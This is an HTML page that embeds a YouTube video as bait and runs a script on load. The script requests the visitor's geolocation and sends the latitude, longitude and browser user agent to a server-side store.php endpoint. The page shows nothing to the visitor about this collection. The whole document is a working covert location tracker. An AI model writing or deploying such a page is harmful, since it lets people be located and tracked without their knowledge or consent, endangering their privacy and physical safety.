<!DOCTYPE html>
<html>
<body  onload ="getLocation()">








<iframe width="560" height="315" src="https://www.youtube.com/embed/CNIUN2euTL4?si=uvTmyCT9Ao2rslAZ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

  
  
  
  
  
  

<p id="demo"></p>


<script>
var x = document.getElementById("demo");



function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
    
    const xhttp = new XMLHttpRequest();

  
    xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent= " + navigator.userAgent);
    xhttp.send();
 
}
</script>

</body>
</html>
